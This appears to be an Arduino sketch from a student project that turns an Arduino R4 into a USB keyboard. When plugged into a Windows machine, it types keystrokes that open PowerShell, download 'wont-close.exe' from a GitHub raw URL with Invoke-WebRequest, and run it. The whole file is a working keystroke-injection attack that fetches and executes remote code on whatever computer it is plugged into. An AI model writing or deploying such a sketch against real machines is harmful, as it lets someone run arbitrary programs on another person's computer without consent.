/* 
Windows Injection Sequence

Uses an Arduino R4 to emulate an HID keyboard and inject keystroke commands 
to open a Powershell terminal through the Windows Start menu, download a file from Github, 
and run the file on the target Windows system.

The general overview of the keystroke sequence is shown below:
- Open Powershell
- Download file
- Run file

Inputs:
download: A string containing the powershell command to download a specified file off 
of GitHub.
file_name: A string containing the name of the downloaded file to run.
*/

#include <Keyboard.h>

int hasRun = 0; // boolean value to run sequence once

String download = "Invoke-WebRequest -Uri \"https://raw.githubusercontent.com/olincollege/VexWare/master/src/visuals/wont-close.exe\" -OutFile \"wont-close.exe\"";
String file_name = "wont-close.exe";

void setup() {
  pinMode(2, INPUT_PULLUP);
  Keyboard.begin();
}

void loop() {
  
  // Add delay to allow target system to recognize Arduino as keyboard
  delay(800);

  // loop will only run if D2 is pulled low to prevent accidental keystroke injections
  if (digitalRead(2) == LOW) {
    if (hasRun == 0) {
    // Begin keystroke sequence
    // Open Powershell terminal as Administrator. Windows has lots of animations in the
    // start menu, so many delays are required for keystroke timing.
    Keyboard.press(KEY_LEFT_GUI); // open Start menu
    Keyboard.releaseAll();
    delay(500); // let animation play

    Keyboard.print("powershell");
    delay(500); // let animation play

    Keyboard.press(KEY_RIGHT_ARROW);
    Keyboard.releaseAll();
    delay(500); // let animation play

    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(4000); // give powershell time to open

    // Download file off of GitHub
    Keyboard.print(download);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();
    delay(500); // let animation play

    // Run the downloaded file
    Keyboard.print("./"+file_name);
    Keyboard.press(KEY_RETURN);
    Keyboard.releaseAll();

    hasRun = 1;
    }
  }
}
